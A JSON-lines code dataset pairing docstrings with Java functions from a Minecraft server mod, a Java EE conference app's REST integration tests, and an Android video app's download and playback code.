{"docstring": "/**\n * Sets the given item stack to the specified slot in the inventory (can be crafting or armor sections).\n */\n", "func_signal": "public void setInventorySlotContents(int par1, ItemStack par2ItemStack)", "code": "{\n    this.dispenserContents[par1] = par2ItemStack;\n\n    if (par2ItemStack != null && par2ItemStack.stackSize > this.getInventoryStackLimit())\n    {\n        par2ItemStack.stackSize = this.getInventoryStackLimit();\n    }\n\n    this.onInventoryChanged();\n}", "path": "src\\net\\minecraft\\tileentity\\TileEntityDispenser.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Writes a tile entity to NBT.\n */\n", "func_signal": "public void writeToNBT(NBTTagCompound par1NBTTagCompound)", "code": "{\n    super.writeToNBT(par1NBTTagCompound);\n    NBTTagList nbttaglist = new NBTTagList();\n\n    for (int i = 0; i < this.dispenserContents.length; ++i)\n    {\n        if (this.dispenserContents[i] != null)\n        {\n            NBTTagCompound nbttagcompound1 = new NBTTagCompound();\n            nbttagcompound1.setByte(\"Slot\", (byte)i);\n            this.dispenserContents[i].writeToNBT(nbttagcompound1);\n            nbttaglist.appendTag(nbttagcompound1);\n        }\n    }\n\n    par1NBTTagCompound.setTag(\"Items\", nbttaglist);\n\n    if (this.isInvNameLocalized())\n    {\n        par1NBTTagCompound.setString(\"CustomName\", this.customName);\n    }\n}", "path": "src\\net\\minecraft\\tileentity\\TileEntityDispenser.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Retrieves the metadata for a {@link Block}, ensuring the block being asked for actually belongs to this BlockMetadataStore's\n * owning world.\n * @see MetadataStoreBase#getMetadata(Object, String)\n */\n", "func_signal": "@Override\npublic List<MetadataValue> getMetadata(Block block, String metadataKey)", "code": "{\n    if(block.getWorld() == owningWorld) {\n        return super.getMetadata(block, metadataKey);\n    } else {\n        throw new IllegalArgumentException(\"Block does not belong to world \" + owningWorld.getName());\n    }\n}", "path": "src\\org\\bukkit\\craftbukkit\\v1_5_R3\\metadata\\BlockMetadataStore.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Instantiate an ender chest facing in a particular direction.\n *\n * @param direction the direction the ender chest's lid opens towards\n */\n", "func_signal": "public EnderChest(BlockFace direction)", "code": "{\n    this();\n    setFacingDirection(direction);\n}", "path": "src\\org\\bukkit\\material\\EnderChest.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * This annotation is used to specify a secondary table for \n * the annotated entity class. Specifying one or more secondary \n * tables indicates that the data for the entity class is stored \n * across multiple tables.\n *\n * <p> If no <code>SecondaryTable</code> annotation is specified, \n * it is assumed that all persistent fields or properties of the \n * entity are mapped to the primary table. If no primary key join \n * columns are specified, the join columns are assumed to reference \n * the primary key columns of the primary table, and have the same \n * names and types as the referenced primary key columns of the \n * primary table.\n *\n * <pre>\n * Example 1: Single secondary table with a single primary key column.\n *\n *    &#064;Entity\n *    &#064;Table(name=\"CUSTOMER\")\n *    &#064;SecondaryTable(name=\"CUST_DETAIL\", \n *        pkJoinColumns=&#064;PrimaryKeyJoinColumn(name=\"CUST_ID\"))\n *    public class Customer { ... } \n *\n *    Example 2: Single secondary table with multiple primary key columns.\n *\n *    &#064;Entity\n *    &#064;Table(name=\"CUSTOMER\")\n *    &#064;SecondaryTable(name=\"CUST_DETAIL\",\n *        pkJoinColumns={\n *            &#064;PrimaryKeyJoinColumn(name=\"CUST_ID\"),\n *            &#064;PrimaryKeyJoinColumn(name=\"CUST_TYPE\")})\n *    public class Customer { ... }\n * </pre>\n *\n * @since Java Persistence 1.0\n */\n", "func_signal": "@Target(TYPE) \n@Retention(RUNTIME)\n\npublic @interface SecondaryTable", "code": "{\n\n    /** (Required) The name of the table. */\n    String name();\n\n    /** (Optional) The catalog of the table.\n     * <p> Defaults to the default catalog.\n     */\n    String catalog() default \"\";\n\n    /** (Optional) The schema of the table.\n     * <p> Defaults to the default schema for user.\n     */\n    String schema() default \"\";\n\n    /** \n     * (Optional) The columns that are used to join with \n     * the primary table.\n     * <p> Defaults to the column(s) of the same name(s) \n     * as the primary key column(s) in the primary table\n     */\n    PrimaryKeyJoinColumn[] pkJoinColumns() default {};\n\n    /**\n     * (Optional) Unique constraints that are to be placed on the \n     * table. These are typically only used if table generation \n     * is in effect. These constraints apply in addition to any \n     * constraints specified by the {@link Column} and {@link JoinColumn} \n     * annotations and constraints entailed by primary key mappings.\n     * <p> Defaults to no additional constraints.\n     */\n    UniqueConstraint[] uniqueConstraints() default {};\n}", "path": "src\\javax\\persistence\\SecondaryTable.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Gets the DyeColor with the given dye data value.\n *\n * @param data Dye data value to fetch\n * @return The {@link DyeColor} representing the given value, or null if it doesn't exist\n * @see #getByWoolData(byte)\n */\n", "func_signal": "public static DyeColor getByDyeData(final byte data)", "code": "{\n    int i = 0xff & data;\n    if (i > BY_DYE_DATA.length) {\n        return null;\n    }\n    return BY_DYE_DATA[i];\n}", "path": "src\\org\\bukkit\\DyeColor.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Set the current item in the slot.\n * @param what The new slot item.\n */\n", "func_signal": "public void setCurrentItem(ItemStack what)", "code": "{\n    if(slot_type == SlotType.OUTSIDE) current = what;\n    else getView().setItem(rawSlot, what);\n}", "path": "src\\org\\bukkit\\event\\inventory\\InventoryClickEvent.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Resets the call count and total time for this listener\n */\n", "func_signal": "public void reset()", "code": "{\n    count = 0;\n    totalTime = 0;\n}", "path": "src\\org\\bukkit\\plugin\\TimedRegisteredListener.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * When some containers are closed they call this on each slot, then drop whatever it returns as an EntityItem -\n * like when you close a workbench GUI.\n */\n", "func_signal": "public ItemStack getStackInSlotOnClosing(int par1)", "code": "{\n    if (this.dispenserContents[par1] != null)\n    {\n        ItemStack itemstack = this.dispenserContents[par1];\n        this.dispenserContents[par1] = null;\n        return itemstack;\n    }\n    else\n    {\n        return null;\n    }\n}", "path": "src\\net\\minecraft\\tileentity\\TileEntityDispenser.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "// MCPC+\n", "func_signal": "public Plugin loadPlugin(File file) throws InvalidPluginException", "code": "{\n       Validate.notNull(file, \"File cannot be null\");\n\n       if (!file.exists()) {\n           throw new InvalidPluginException(new FileNotFoundException(file.getPath() + \" does not exist\"));\n       }\n\n       // MCPC+ start - file-based plugin remapper using SrgTools ApplySrg\n\n       YamlConfiguration configuration = ((CraftServer)Bukkit.getServer()).configuration;\n       String pluginBaseName = file.getName().substring(0, file.getName().indexOf(\".\"));\n\n       if ((configuration.getBoolean(\"mcpc.plugin-settings.default.remap-plugin-file\", false) || configuration.getBoolean(\"mcpc.plugin-settings.\"+pluginBaseName+\".remap-plugin-file\", false)) && !warnedLegacy) {\n           server.getLogger().warning(\"Legacy remap-plugin-file SrgTools file-based remapper no longer included but bukkit.yml remap-plugin-file is true; ignoring. \"+\n               \"If needed, the old tool can be found at https://github.com/MinecraftPortCentral/MCPC-Plus/tree/5210aa0c613f3a1bdccaadc8af9f1b253e871da3/plugins - \"+\n               \"but please try the new SpecialSource-based in-memory remapper enabled with custom-class-loader (on by default since MCPC+ build 27+) and report \"+\n               \"any problems to http://www.mcportcentral.co.za/.\");\n           warnedLegacy = true;\n       }\n\n       // MCPC+ end\n\n       PluginDescriptionFile description;\n       try {\n           description = getPluginDescription(file);\n       } catch (InvalidDescriptionException ex) {\n           throw new InvalidPluginException(ex);\n       }\n\n       File dataFolder = new File(file.getParentFile(), description.getName());\n       File oldDataFolder = getDataFolder(file);\n\n       // Found old data folder\n       if (dataFolder.equals(oldDataFolder)) {\n           // They are equal -- nothing needs to be done!\n       } else if (dataFolder.isDirectory() && oldDataFolder.isDirectory()) {\n           server.getLogger().log(Level.INFO, String.format(\n               \"While loading %s (%s) found old-data folder: %s next to the new one: %s\",\n               description.getName(),\n               file,\n               oldDataFolder,\n               dataFolder\n           ));\n       } else if (oldDataFolder.isDirectory() && !dataFolder.exists()) {\n           if (!oldDataFolder.renameTo(dataFolder)) {\n               throw new InvalidPluginException(\"Unable to rename old data folder: '\" + oldDataFolder + \"' to: '\" + dataFolder + \"'\");\n           }\n           server.getLogger().log(Level.INFO, String.format(\n               \"While loading %s (%s) renamed data folder: '%s' to '%s'\",\n               description.getName(),\n               file,\n               oldDataFolder,\n               dataFolder\n           ));\n       }\n\n       if (dataFolder.exists() && !dataFolder.isDirectory()) {\n           throw new InvalidPluginException(String.format(\n               \"Projected datafolder: '%s' for %s (%s) exists and is not a directory\",\n               dataFolder,\n               description.getName(),\n               file\n           ));\n       }\n\n       List<String> depend = description.getDepend();\n       if (depend == null) {\n           depend = ImmutableList.<String>of();\n       }\n\n       for (String pluginName : depend) {\n           if (loaders == null) {\n               throw new UnknownDependencyException(pluginName);\n           }\n           PluginClassLoader current = loaders.get(pluginName);\n\n           if (current == null) {\n               throw new UnknownDependencyException(pluginName);\n           }\n       }\n\n       PluginClassLoader loader = null;\n       JavaPlugin result = null;\n\n       try {\n           URL[] urls = new URL[1];\n\n           urls[0] = file.toURI().toURL();\n\n           if (description.getClassLoaderOf() != null) {\n               loader = loaders.get(description.getClassLoaderOf());\n               loader.addURL(urls[0]);\n           } else {\n               loader = new PluginClassLoader(this, urls, getClass().getClassLoader(), description); // MCPC+ - pass description\n           }\n\n           Class<?> jarClass = Class.forName(description.getMain(), true, loader);\n           Class<? extends JavaPlugin> plugin = jarClass.asSubclass(JavaPlugin.class);\n\n           Constructor<? extends JavaPlugin> constructor = plugin.getConstructor();\n\n           result = constructor.newInstance();\n\n           result.initialize(this, server, description, dataFolder, file, loader);\n       } catch (InvocationTargetException ex) {\n           throw new InvalidPluginException(ex.getCause());\n       } catch (Throwable ex) {\n           throw new InvalidPluginException(ex);\n       }\n\n       loaders.put(description.getName(), loader);\n\n       return result;\n   }", "path": "src\\org\\bukkit\\plugin\\java\\JavaPluginLoader.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Get the current item in the clicked slot.\n * @return The slot item.\n */\n", "func_signal": "public ItemStack getCurrentItem()", "code": "{\n    if(slot_type == SlotType.OUTSIDE) return current;\n    return getView().getItem(rawSlot);\n}", "path": "src\\org\\bukkit\\event\\inventory\\InventoryClickEvent.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "// Given\n", "func_signal": "@Deployment\npublic static WebArchive deploy()", "code": "{\n    return ShrinkWrap.create(WebArchive.class)\n        .addAsLibraries(\n            ConferenceDeployments.conference().addClasses(ConferenceTestCase.class, TestUtils.class)\n                .addAsManifestResource(new StringAsset(\n                    PersistenceDeployments.descriptor().exportAsString()), \"persistence.xml\")\n                .addAsManifestResource(new File(\"src/main/resources/META-INF/beans.xml\")))\n        .addAsWebInfResource(EmptyAsset.INSTANCE, \"beans.xml\");\n}", "path": "code\\application\\domain\\conference\\src\\test\\java\\org\\cedj\\geekseek\\domain\\conference\\test\\integration\\ConferenceTestCase.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able create a Session for a Conference\n", "func_signal": "@Test @InSequence(5)\npublic void shouldBeAbleToCreateSession() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_session);\n\n    SessionType session = getCreateSession();\n\n    uri_sessionInstance =\n          given().\n              contentType(SESSION_MEDIA_TYPE).\n              body(session).\n          then().\n              statusCode(Status.CREATED.getStatusCode()).\n          when().\n              post(uri_session).\n          header(\"Location\");\n}", "path": "code\\application\\web\\rest\\conference\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\conference\\test\\integration\\story\\CreateConferenceAndSessionStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able update a Attachment\n", "func_signal": "@Test @InSequence(3)\npublic void shouldBeAbleToUpdateAttachment() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_attachmentInstance);\n\n    AttachmentType conf = getUpdateAttachment();\n\n    given().\n        contentType(ATTACHMENT_MEDIA_TYPE).\n        body(conf).\n    then().\n        statusCode(Status.NO_CONTENT.getStatusCode()).\n    when().\n        put(uri_attachmentInstance);\n}", "path": "code\\application\\web\\rest\\attachment\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\attachment\\test\\integration\\story\\CreateAttachmentStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able get a Session\n", "func_signal": "@Test @InSequence(7)\npublic void shouldBeAbleToGetSession() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_sessionInstance);\n\n    given().\n    then().\n       contentType(SESSION_MEDIA_TYPE).\n       statusCode(Status.OK.getStatusCode()).\n       root(\"session\").\n           body(\"link.find {it.@rel == 'bookmark'}.size()\", equalTo(1)).\n           body(\"link.find {it.@rel == 'self'}.size()\", equalTo(1)).\n           body(\"link.find {it.@rel == 'parent'}.size()\", equalTo(1)).\n    when().\n       get(uri_sessionInstance);\n}", "path": "code\\application\\web\\rest\\conference\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\conference\\test\\integration\\story\\CreateConferenceAndSessionStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able remove a Session from a Conference\n", "func_signal": "@Test @InSequence(10)\npublic void shouldBeAbleToDeleteSession() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_sessionInstance);\n\n    given().\n    then().\n       statusCode(Status.NO_CONTENT.getStatusCode()).\n    when().\n       delete(uri_sessionInstance);\n}", "path": "code\\application\\web\\rest\\conference\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\conference\\test\\integration\\story\\CreateConferenceAndSessionStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able remove a Conference\n", "func_signal": "@Test @InSequence(12)\npublic void shouldBeAbleToDeleteConference() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_conferenceInstance);\n\n    given().\n    then().\n       statusCode(Status.NO_CONTENT.getStatusCode()).\n    when().\n       delete(uri_conferenceInstance);\n}", "path": "code\\application\\web\\rest\\conference\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\conference\\test\\integration\\story\\CreateConferenceAndSessionStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able get a Attachment\n", "func_signal": "@Test @InSequence(2)\npublic void shouldBeAbleToGetAttachment() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_attachmentInstance);\n\n    given().\n    then().\n        contentType(ATTACHMENT_MEDIA_TYPE).\n        statusCode(Status.OK.getStatusCode()).\n    when().\n        get(uri_attachmentInstance).\n    body().\n        path(\"attachment.link.find {it.@rel == 'session'}.@href\");\n}", "path": "code\\application\\web\\rest\\attachment\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\attachment\\test\\integration\\story\\CreateAttachmentStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "//  /context-path/app-root/resource\n", "func_signal": "private String getResourceRequestPath(HttpServletRequest request)", "code": "{\n    String contextPath = request.getServletContext().getContextPath();\n    String path = request.getRequestURI().replace(contextPath + APP, \"\");\n    return path;\n}", "path": "code\\application\\web\\ui\\core\\src\\main\\java\\org\\cedj\\geekseek\\web\\core\\servlet\\AppFilter.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able get a Conference\n", "func_signal": "@Test @InSequence(2)\npublic void shouldBeAbleToGetConference() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_conferenceInstance);\n\n    uri_session =\n          given().\n          then().\n              contentType(CONFERENCE_MEDIA_TYPE).\n              statusCode(Status.OK.getStatusCode()).\n              root(\"conference\").\n                  body(\"link.find {it.@rel == 'bookmark'}.size()\", equalTo(1)).\n                  body(\"link.find {it.@rel == 'self'}.size()\", equalTo(1)).\n          when().\n              get(uri_conferenceInstance).\n          body().\n              path(\"conference.link.find {it.@rel == 'session'}.@href\");\n}", "path": "code\\application\\web\\rest\\conference\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\conference\\test\\integration\\story\\CreateConferenceAndSessionStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Given\n", "func_signal": "@Deployment\npublic static WebArchive deploy()", "code": "{\n    return ShrinkWrap.create(WebArchive.class)\n        .addAsLibraries(\n            ConferenceDeployments.conference().addClasses(ConferenceTestCase.class, TestUtils.class)\n                .addAsManifestResource(new StringAsset(\n                    PersistenceDeployments.descriptor() .exportAsString()), \"persistence.xml\")\n                .addAsManifestResource(new File(\"src/main/resources/META-INF/beans.xml\")))\n        .addAsWebInfResource(EmptyAsset.INSTANCE, \"beans.xml\")\n        .addClass(BaseTransactionalSpecification.class);\n}", "path": "code\\application\\domain\\conference\\src\\test\\java\\org\\cedj\\geekseek\\domain\\conference\\test\\integration\\ConferenceRepositoryTransactionalTestCase.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a User I should be able to remove a Conference\n", "func_signal": "@Test\n@UsingDataSet(\"conference.yml\")\n@ShouldMatchDataSet(\"conference_empty.yml\")\npublic void shouldBeAbleToRemoveConference()", "code": "{\n\n    Conference conference = repository.get(\"CA\");\n\n    repository.remove(conference);\n    Assert.assertTrue(removedEventFired);\n}", "path": "code\\application\\domain\\conference\\src\\test\\java\\org\\cedj\\geekseek\\domain\\conference\\test\\integration\\ConferenceTestCase.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able locate the Attachment root Resource\n", "func_signal": "@Test @InSequence(0)\npublic void shouldNotBeAbleToLocateAttachmentRoot() throws Exception", "code": "{\n          given().\n          then().\n              contentType(BASE_MEDIA_TYPE).\n              statusCode(Status.OK.getStatusCode()).\n              root(\"root\").\n                  body(\"link.find {it.@rel == 'attachment'}.size()\", equalTo(0)).\n          when().\n              get(new URL(base, \"api/\").toExternalForm()).\n          body();\n}", "path": "code\\application\\web\\rest\\attachment\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\attachment\\test\\integration\\story\\CreateAttachmentStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able locate the Conference root Resource\n", "func_signal": "@Test @InSequence(0)\npublic void shouldBeAbleToLocateConferenceRoot() throws Exception", "code": "{\n    //uri_conference = new URL(base, \"api/conference\").toExternalForm();\n    uri_conference =\n          given().\n          then().\n              contentType(BASE_MEDIA_TYPE).\n              statusCode(Status.OK.getStatusCode()).\n              root(\"root\").\n                  body(\"link.find {it.@rel == 'conference'}.size()\", equalTo(1)).\n          when().\n              get(new URL(base, \"api/\").toExternalForm()).\n          body().\n              path(\"root.link.find {it.@rel == 'conference'}.@href\");\n}", "path": "code\\application\\web\\rest\\conference\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\conference\\test\\integration\\story\\CreateConferenceAndSessionStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able get a User\n", "func_signal": "@Test @InSequence(2)\npublic void shouldBeAbleToGetUser() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_userInstance);\n\n    given().\n    then().\n        contentType(USER_MEDIA_TYPE).\n        statusCode(Status.OK.getStatusCode()).\n    when().\n        get(uri_userInstance);\n}", "path": "code\\application\\web\\rest\\user\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\user\\test\\integration\\story\\CreateUserStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "/**\n * Receives the next message off the JMS Queue, unwraps it, and\n * dispatches to the SMTP Mail Service to be sent\n * @param message\n */\n", "func_signal": "@Override\npublic void onMessage(final Message message)", "code": "{\n\n    // Casting and unwrapping\n    final ObjectMessage objectMessage;\n    try {\n        objectMessage = ObjectMessage.class.cast(message);\n    } catch (final ClassCastException cce) {\n        throw new RuntimeException(\"Incorrect message type sent to object message consumer; got:\"\n                + message.getClass().getSimpleName(), cce);\n    }\n    final MailMessageBuilder.MailMessage mailMessage;\n    try {\n        final Object obj = objectMessage.getObject();\n        mailMessage = MailMessageBuilder.MailMessage.class.cast(obj);\n    } catch (final JMSException jmse) {\n        throw new RuntimeException(\"Could not unwrap JMS Message\", jmse);\n    } catch (final ClassCastException cce) {\n        throw new RuntimeException(\"Expected message contents of type \"\n                + MailMessageBuilder.MailMessage.class.getSimpleName(), cce);\n    }\n\n    // Send the mail\n    mailService.sendMail(mailMessage);\n}", "path": "code\\application\\service\\smtp\\src\\main\\java\\org\\cedj\\geekseek\\service\\smtp\\SMTPMessageConsumer.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able update a User\n", "func_signal": "@Test @InSequence(3)\npublic void shouldBeAbleToUpdateUser() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_userInstance);\n\n    UserType conf = getUpdateUser();\n\n    given().\n        contentType(USER_MEDIA_TYPE).\n        body(conf).\n    then().\n        statusCode(Status.NO_CONTENT.getStatusCode()).\n    when().\n        put(uri_userInstance);\n}", "path": "code\\application\\web\\rest\\user\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\user\\test\\integration\\story\\CreateUserStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able locate the User root Resource\n", "func_signal": "@Test @InSequence(0)\npublic void shouldNotBeAbleToLocateUserRoot() throws Exception", "code": "{\n          given().\n          then().\n              contentType(BASE_MEDIA_TYPE).\n              statusCode(Status.OK.getStatusCode()).\n              root(\"root\").\n                  body(\"link.find {it.@rel == 'user'}.size()\", equalTo(0)).\n          when().\n              get(new URL(base, \"api/\").toExternalForm()).\n          body();\n}", "path": "code\\application\\web\\rest\\user\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\user\\test\\integration\\story\\CreateUserStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able remove a Attachment\n", "func_signal": "@Test @InSequence(10)\npublic void shouldBeAbleToDeleteAttachment() throws Exception", "code": "{\n    assertNotNull(\"Previous step failed\", uri_attachmentInstance);\n\n    given().\n    then().\n       statusCode(Status.NO_CONTENT.getStatusCode()).\n    when().\n       delete(uri_attachmentInstance);\n}", "path": "code\\application\\web\\rest\\attachment\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\attachment\\test\\integration\\story\\CreateAttachmentStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able create a User\n", "func_signal": "@Test @InSequence(1)\npublic void shouldBeAbleToCreateUser() throws Exception", "code": "{\n    // User is not a top level resource, so in the test we hardcode the known location\n    uri_user = new URL(base, \"api/user\").toExternalForm();\n\n    UserType conf = getCreateUser();\n\n    uri_userInstance =\n          given().\n              contentType(USER_MEDIA_TYPE).\n              body(conf).\n          then().\n              statusCode(Status.CREATED.getStatusCode()).\n          when().\n              post(uri_user).\n          header(\"Location\");\n}", "path": "code\\application\\web\\rest\\user\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\user\\test\\integration\\story\\CreateUserStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "// Story: As a 3. party Integrator I should be able create a Attachment\n", "func_signal": "@Test @InSequence(1)\npublic void shouldBeAbleToCreateAttachment() throws Exception", "code": "{\n    // Attachment is not a top level resource, so in the test we hardcode the known location\n    uri_attachment = new URL(base, \"api/attachment\").toExternalForm();\n\n    AttachmentType conf = getCreateAttachment();\n\n    uri_attachmentInstance =\n          given().\n              contentType(ATTACHMENT_MEDIA_TYPE).\n              body(conf).\n          then().\n              statusCode(Status.CREATED.getStatusCode()).\n          when().\n              post(uri_attachment).\n          header(\"Location\");\n}", "path": "code\\application\\web\\rest\\attachment\\src\\test\\java\\org\\cedj\\geekseek\\web\\rest\\attachment\\test\\integration\\story\\CreateAttachmentStory.java", "repo_name": "arquillian/continuous-enterprise-development", "stars": 117, "license": "None", "language": "java", "size": 12578}
{"docstring": "/**\n * Delete the download job and related files.\n */\n", "func_signal": "public void deleteDownload(DownloadJob job)", "code": "{\n    if(job == null) throw new NullPointerException(\"job cannot be null\");\n    mProvider.removeDownload(job);\n    deleteDownloadFile(job);\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\download\\DownloadManager.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * \u83b7\u5f97SD\u5361\u5269\u4f59\u7a7a\u95f4\n * \n * @return SD\u5361\u672a\u6302\u8f7d\u5219\u8fd4\u56de-1\n */\n", "func_signal": "@SuppressWarnings(\"deprecation\")\n@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)\npublic static long getExternalAvailable()", "code": "{\n    if (AcApp.isExternalStorageAvailable()) {\n        StatFs sf = new StatFs(Environment.getExternalStorageDirectory().getPath());\n        long blockSize ,availCount;\n        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2){\n            blockSize = sf.getBlockSizeLong();\n            availCount = sf.getAvailableBlocksLong();\n        }else{\n            blockSize = sf.getBlockSize();\n            availCount = sf.getAvailableBlocks();\n        }\n        return availCount * blockSize;\n    } else\n        return -1;\n\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * Set the display options\n * \n * @param layout\n *            <ul>\n *            <li>{@link #VIDEO_LAYOUT_ORIGIN}\n *            <li>{@link #VIDEO_LAYOUT_SCALE}\n *            <li>{@link #VIDEO_LAYOUT_STRETCH}\n *            <li>{@link #VIDEO_LAYOUT_ZOOM}\n *            </ul>\n * @param aspectRatio\n *            video aspect ratio, will audo detect if 0.\n */\n", "func_signal": "public void setVideoLayout(int layout, float aspectRatio)", "code": "{\n    LayoutParams lp = getLayoutParams();\n    DisplayMetrics disp = mContext.getResources().getDisplayMetrics();\n    int windowWidth = disp.widthPixels, windowHeight = disp.heightPixels;\n    float windowRatio = windowWidth / (float) windowHeight;\n    float videoRatio = aspectRatio <= 0.01f ? mVideoAspectRatio : aspectRatio;\n    mSurfaceHeight = mVideoHeight;\n    mSurfaceWidth = mVideoWidth;\n    if (VIDEO_LAYOUT_ORIGIN == layout && mSurfaceWidth < windowWidth && mSurfaceHeight < windowHeight) {\n        lp.width = (int) (mSurfaceHeight * videoRatio);\n        lp.height = mSurfaceHeight;\n    } else if (layout == VIDEO_LAYOUT_ZOOM) {\n        lp.width = windowRatio > videoRatio ? windowWidth : (int) (videoRatio * windowHeight);\n        lp.height = windowRatio < videoRatio ? windowHeight : (int) (windowWidth / videoRatio);\n    } else {\n        boolean full = layout == VIDEO_LAYOUT_STRETCH;\n        lp.width = (full || windowRatio < videoRatio) ? windowWidth : (int) (videoRatio * windowHeight);\n        lp.height = (full || windowRatio > videoRatio) ? windowHeight : (int) (windowWidth / videoRatio);\n    }\n    setLayoutParams(lp);\n    getHolder().setFixedSize(mSurfaceWidth, mSurfaceHeight);\n    Log.d(\"VIDEO: %dx%dx%f, Surface: %dx%d, LP: %dx%d, Window: %dx%dx%f\", mVideoWidth, mVideoHeight, mVideoAspectRatio, mSurfaceWidth,\n            mSurfaceHeight, lp.width, lp.height, windowWidth, windowHeight, windowRatio);\n    mVideoLayout = layout;\n    mAspectRatio = aspectRatio;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\player\\VideoView.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
